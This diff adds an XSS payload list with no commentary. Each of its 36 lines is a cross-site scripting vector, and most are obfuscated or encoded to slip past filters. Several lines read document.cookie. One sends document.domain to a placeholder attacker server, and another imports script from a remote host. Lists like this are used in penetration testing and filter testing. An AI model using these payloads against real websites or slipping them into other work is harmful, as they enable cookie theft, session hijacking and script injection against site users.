@@ -1,0 +1,36 @@
+<a"/onclick=(confirm)()>Click Here!
+Dec: <svg onload=prompt%26%230000000040document.domain)>
+Hex: <svg onload=prompt%26%23x000000028;document.domain)>
+xss'"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>
+<a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;">X</a>
+<--%253cimg%20onerror=alert(1)%20src=a%253e --!>
+<a+HREF='%26%237javascrip%26%239t:alert%26lpar;document.domain)'>
+javascript:{ alert`0` }
+1'"><img/src/onerror=.1|alert``>
+<img src=x onError=import('//1152848220/')>
+%2sscript%2ualert()%2s/script%2u
+<svg on onload=(alert)(document.domain)>
+<img ignored=() src=x onerror=prompt(1)>
+<svg onx=() onload=(confirm)(1)>
+“><img%20src=x%20onmouseover=prompt%26%2300000000000000000040;document.cookie%26%2300000000000000000041;
+<svg on =i onload=alert(domain)
+<svg/onload=location/**/='https://your.server/'+document.domain>
+<svg onx=() onload=window.alert?.()>
+test",prompt%0A/*HelloWorld*/(document.domain)
+"onx+%00+onpointerenter%3dalert(domain)+x"
+"><svg%20onload=alert%26%230000000040"1")>
+%27%09);%0d%0a%09%09[1].find(alert)//
+"><img src=1 onmouseleave=print()>
+&lt;img longdesc="src='x'onerror​=alert(document.domain);//&gt;&lt;img " src='showme'&gt;
+<svg on onload=(alert)(document.domain)>
+<svg/on%20onload=alert(1)>
+<img/src=x onError="`${x}`;alert(`Ex.Mi`);">
+“;</script><script>prompt(document.cookie)</script>;//{"“
+ "><img src="/" =_=" title="onerror​='prompt(document.cookie)'">
+%22%3e%3c%69%6d%67%20%73%72%63%3d%78%20%6f%6e%65%72%72%6f%72%3d%22%74%68%69%73%2e%6f%6e%65%72%72%6f%72%3d%6e%75%6c%6c%3b%61%6c%65%72%74%28%31%29%22%3e
+<img%20hrEF="x"%20sRC="data:x,"%20oNLy=1%20oNErrOR=prompt`1`>
+"><img src="/" =_=" title="onerror​='prompt(document.cookie)'">
+">\x3csVg/<sVg/oNloAd​=alert(1337)//>\x3e
+\u0022\u003c%26quot;%26gt;%26lt;"';}};“><​/SCRIPT><img src=x onerror​=alert(69)>${{7*7}}
+'-alert(document/*xss*/.cookie)-'
+"><img/src=x/onerro=6><img/src="1"/onerror​=alert(1);>
